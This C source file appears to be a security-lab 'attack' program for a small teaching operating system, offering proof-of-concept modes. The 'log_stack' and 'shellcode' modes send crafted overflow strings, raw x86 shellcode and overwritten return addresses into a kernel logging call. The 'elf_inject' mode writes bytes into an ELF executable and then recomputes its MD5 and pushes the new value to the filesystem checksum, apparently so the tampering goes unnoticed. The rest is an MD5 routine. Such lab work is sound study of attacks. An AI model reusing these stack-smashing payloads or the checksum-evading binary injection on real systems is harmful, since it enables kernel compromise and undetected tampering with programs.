//
// Created by Rinpo on 24-12-18.
//
//#include "proc.h"
//#include "proto.h"

#include "sys/const.h"
#include "stdio.h"
#include "string.h"
// #include "type.h"
#include "syscall.h"
#include "log.h"
#include "elf.h"

#define PAGESIZE 4096

#define MD5_BLOCK_SIZE 64      // MD5处理块的大小
#define MD5_DIGEST_SIZE 16

#define MD5_F(X, Y, Z) ((X & Y) | (~X & Z))
#define MD5_G(X, Y, Z) ((X & Z) | (Y & ~Z))
#define MD5_H(X, Y, Z) (X ^ Y ^ Z)
#define MD5_I(X, Y, Z) (Y ^ (X | ~Z))
#define ROTATE_LEFT(X, N) ((X << N) | (X >> (32 - N)))

typedef struct{
    u64 size;        // 输入长度
    u32 buffer[4];   // Current accumulation of hash
    u8 input[64];    // Input to be used in the next step
    u8 digest[16];   // 结果
}MD5Context;

void cal_addr(int entry, int addr[]);
void inject(char* elf_file);
void insert(Elf32_Ehdr elf_ehdr, char* elf_file, int old_entry);
void checksum_md5_file(int fd, char *result);

void help() {
    printf("Usage: attack <poc>\n");
    printf("Available poc:\n");
    printf("\t- log_stack: log stack overflow\n");
    printf("\t- shellcode: log stack with shellcode\n");
    printf("\t- elf_inject <file>: elf inject\n");
    printf("\t- stack: stack isolation\n");
}


int main(int argc, char *argv[]) {
    if(argc < 2) {
        help();
    } else {
        if (!strcmp(argv[1], "log_stack")) {
            custom_log("hacked_by_rinpostk\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb\xde\x5d\x00\x00\x01\x00\x00\x00");
            return 0;
        }
        if (!strcmp(argv[1], "shellcode")) {
            custom_log("\xB8\x2C\x4B\xFC\xFF\xB9\x68\x54\xF8\xFF\x29\xC8\x83\xC0\x32\x50\xB8\x2C\x4B\xFC\xFF\xb9\xd9\xf7\xfb\xff\x29\xc8\xff\xd0\x90\x90\x90\x90""aaaaaaaaaaaaaaaahacked_by_rinpostk\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""\x05\x05\x05\x05\xc4\xf6\x03\x00\x00\x00\x05\x00");
            return 0;
        }
        if (!strcmp(argv[1], "elf_inject")) {
            if (argc != 3) {
                help();
                return 0;
            }
            inject(argv[2]);
            return 0;
        }
        if (!strcmp(argv[1], "stack")) {
            unsigned int sp;
            asm("movl %%esp, %0" : "=r"(sp));
            printf("%d\n", sp);
            unsigned int tmp = 0;
            //
            // asm("movl %0, %%esp" : "=r"(tmp));
            for (unsigned int i = 0; i < 0x4000 * 2; i++ ) {
                asm("push %0" : "=r"(tmp));
            }

            asm("movl %%esp, %0" : "=r"(sp));
            printf("%d\n", sp);
            return 0;
        }
        if (!strcmp(argv[1], "help")) {
            return 0;
        }
        printf("unknown poc\n");
    }
    return 0;
}

void cal_addr(int entry, int addr[]) {
    int temp = entry;
    int i;
    for (i = 0; i < 4; i++) {
        addr[i] = temp % 256;
        temp /= 256;
    }
}

void inject(char* elf_file) {
    printf("start to inject...\n");

    int old_entry;
    Elf32_Ehdr elf_ehdr;
    Elf32_Phdr elf_phdr;

    int old_file = open(elf_file, O_RDWR);
    read(old_file, &elf_ehdr, sizeof(Elf32_Ehdr));
    old_entry = elf_ehdr.e_entry;
    printf("old_entry: %x\n", old_entry);

    // Modify e_shoff of ELF Header，adding PAGESIZE
    // elf_ehdr.e_shoff += PAGESIZE;

    int i = 0;

    printf("Modifying the program header table...\n");
    // 读取并修改程序头部表
    close(old_file);
    old_file = open(elf_file, O_RDWR);
    char buffer[20000];
    read(old_file, buffer, elf_ehdr.e_phoff);
    read(old_file, &elf_phdr, sizeof(elf_phdr));

    printf("Inserting the injector...\n");
    // 插入注入程序
    close(old_file);
    insert(elf_ehdr, elf_file, old_entry);
}

void insert(Elf32_Ehdr elf_ehdr, char* elf_file, int old_entry) {
    // 程序的原始入口地址
    int old_entry_addr[4];
    cal_addr(old_entry, old_entry_addr);

    // printf("old_entry = 0x%x%x%x%x\n", old_entry_addr[3],old_entry_addr[2],old_entry_addr[1],old_entry_addr[0]);
    // 每一行对应一条汇编代码
    char inject_code[] = {
        0x68,
        0x00,
        0x20,
        0x00,
        0x00
    };
    int inject_size = sizeof(inject_code);

    // 防止注入代码太大
    if (inject_size > PAGESIZE) {
        printf("Injecting code is too big!\n");
        exit(0);
    }
    int old_file = open(elf_file, O_RDWR);
    u8 buffer[20000];
    read(old_file, buffer, 0x1024);
    write(old_file, inject_code, inject_size);
    close(old_file);
    old_file = open(elf_file, O_RDWR);
    read(old_file, buffer, 0x1024);
    read(old_file, buffer, 5);
    for (int i = 0; i < 5; i++) {
        printf("%x\n", buffer[i]);
    }
    close(old_file);

    // update md5
    int fd = open(elf_file, O_RDWR);
    char res[MD5_DIGEST_SIZE] = { 0 };
    checksum_md5_file(fd, res);

    MESSAGE msg;
    msg.type = FS_CHECKSUM;
    msg.BUF  = (void*)res;
    msg.PATHNAME = elf_file;

    user_syscall(msg);

    close(fd);
    printf("Finished!\n");
}

const u32 S[] = {7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22,
                       5,  9, 14, 20, 5,  9, 14, 20, 5,  9, 14, 20, 5,  9, 14, 20,
                       4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23,
                       6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21};

const u32 K[] = {0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee,
                       0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501,
                       0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be,
                       0x6b901122, 0xfd987193, 0xa679438e, 0x49b40821,
                       0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa,
                       0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8,
                       0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed,
                       0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a,
                       0xfffa3942, 0x8771f681, 0x6d9d6122, 0xfde5380c,
                       0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70,
                       0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05,
                       0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665,
                       0xf4292244, 0x432aff97, 0xab9423a7, 0xfc93a039,
                       0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1,
                       0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1,
                       0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391};

const u8 PADDING[] =	{0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

void md5_step(u32 *buffer, u32 *input){
    u32 AA = buffer[0];
    u32 BB = buffer[1];
    u32 CC = buffer[2];
    u32 DD = buffer[3];

    u32 E;

    unsigned int j;

    for(unsigned int i = 0; i < 64; ++i){
        switch(i / 16){
            case 0:
                E = MD5_F(BB, CC, DD);
            j = i;
            break;
            case 1:
                E = MD5_G(BB, CC, DD);
            j = ((i * 5) + 1) % 16;
            break;
            case 2:
                E = MD5_H(BB, CC, DD);
            j = ((i * 3) + 5) % 16;
            break;
            default:
                E = MD5_I(BB, CC, DD);
            j = (i * 7) % 16;
            break;
        }

        u32 temp = DD;
        DD = CC;
        CC = BB;
        BB = BB + ROTATE_LEFT(AA + E + K[i] + input[j], S[i]);
        AA = temp;
    }

    buffer[0] += AA;
    buffer[1] += BB;
    buffer[2] += CC;
    buffer[3] += DD;
}

void md5_update(MD5Context *ctx, char *input_buffer, u32 input_len){
    u32 input[16];
    unsigned int offset = ctx->size % 64;
    ctx->size += (u64)input_len;

    for(unsigned int i = 0; i < input_len; ++i){
        ctx->input[offset++] = (u8)*(input_buffer + i);

        // If we've filled our context input, copy it into our local array input
        // then reset the offset to 0 and fill in a new buffer.
        // Every time we fill out a chunk, we run it through the algorithm
        // to enable some back and forth between cpu and i/o
        if(offset % 64 == 0){
            for(unsigned int j = 0; j < 16; ++j){
                // Convert to little-endian
                // The local variable `input` our 512-bit chunk separated into 32-bit words
                // we can use in calculations
                input[j] = (u32)(ctx->input[(j * 4) + 3]) << 24 |
                           (u32)(ctx->input[(j * 4) + 2]) << 16 |
                           (u32)(ctx->input[(j * 4) + 1]) <<  8 |
                           (u32)(ctx->input[(j * 4)]);
            }
            md5_step(ctx->buffer, input);
            offset = 0;
        }
    }
}

void md5_finalize(MD5Context *ctx){
    u32 input[16];
    u16 offset = ctx->size % 64;
    unsigned int padding_length = offset < 56 ? 56 - offset : (56 + 64) - offset;

    // Fill in the padding and undo the changes to size that resulted from the update
    md5_update(ctx, PADDING, padding_length);
    ctx->size -= (u64)padding_length;

    // Do a final update (internal to this function)
    // Last two 32-bit words are the two halves of the size (converted from bytes to bits)
    for(unsigned int j = 0; j < 14; ++j){
        input[j] = (u32)(ctx->input[(j * 4) + 3]) << 24 |
                   (u32)(ctx->input[(j * 4) + 2]) << 16 |
                   (u32)(ctx->input[(j * 4) + 1]) <<  8 |
                   (u32)(ctx->input[(j * 4)]);
    }
    input[14] = (u32)(ctx->size * 8);
    input[15] = (u32)((ctx->size * 8) >> 32);

    md5_step(ctx->buffer, input);

    // Move the result into digest (convert from little-endian)
    for(unsigned int i = 0; i < 4; ++i){
        ctx->digest[(i * 4) + 0] = (u8)((ctx->buffer[i] & 0x000000FF));
        ctx->digest[(i * 4) + 1] = (u8)((ctx->buffer[i] & 0x0000FF00) >>  8);
        ctx->digest[(i * 4) + 2] = (u8)((ctx->buffer[i] & 0x00FF0000) >> 16);
        ctx->digest[(i * 4) + 3] = (u8)((ctx->buffer[i] & 0xFF000000) >> 24);
    }
}

void checksum_md5_file(int fd, char *result) {
    MD5Context ctx;

    u8 input_buffer[1024] = { 0 };
    u32 bytes_read;

    // init md5 ctx
    ctx.size = (u64)0;
    ctx.buffer[0] = (u32)0x67452301;
    ctx.buffer[1] = (u32)0xefcdab89;
    ctx.buffer[2] = (u32)0x98badcfe;
    ctx.buffer[3] = (u32)0x10325476;

    while ((bytes_read = read(fd, input_buffer, 1024)) > 0) {
        md5_update(&ctx, input_buffer, bytes_read);
    }

    md5_finalize(&ctx);
    for (int i = 0; i < MD5_DIGEST_SIZE; ++i) {
        result[i] = ctx.digest[i];
    }
}
